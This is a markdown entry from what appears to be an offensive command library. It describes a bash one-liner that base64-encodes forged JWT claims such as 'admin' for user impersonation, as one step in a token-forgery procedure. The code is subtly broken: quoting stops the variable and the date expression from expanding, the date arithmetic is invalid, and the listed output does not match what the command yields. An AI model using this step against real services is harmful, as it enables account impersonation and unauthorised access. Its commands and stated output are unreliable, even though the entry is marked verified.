---
id: a6939d08-8852-45e4-ba67-a1b17a28a024
name: jwt-set-payload-claims
type: command
executor: bash
data: 'echo ''{"login":"$_TARGET_USER"}'' | base64 -w 0'
output: null
created_at: '2023-04-06T03:56:00.839884+00:00'
updated_at: '2023-04-10T20:22:36.345573+00:00'
platforms:
  - Linux
  - macOS
tags:
  - jwt
  - payload
verified: true
validated: true
---

# jwt-set-payload-claims

## Command

```bash
echo '{"login":"$_TARGET_USER"}' | base64 -w 0
```

## Description

Generates and base64-encodes a custom JWT payload with user claims for impersonation. This is the payload segment used in token forgery.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_USER | Desired username or claim value (e.g., 'admin') | Yes |

## Examples

### Basic Usage

```bash
echo '{"login":"admin"}' | base64 -w 0
```

### Advanced Usage

```bash
echo '{"sub":"admin","exp":$(date +%s + 3600)}' | base64 -w 0
```

## Expected Output

eyJsb2dpbiI6ImFkbWluIn0

Base64-encoded payload string.

## Related

- [[procedures/JWT-Token-Forgery-via-JWKS-Header-Injection]]
- [[commands/jwt-set-header-rs256-with-jku]]
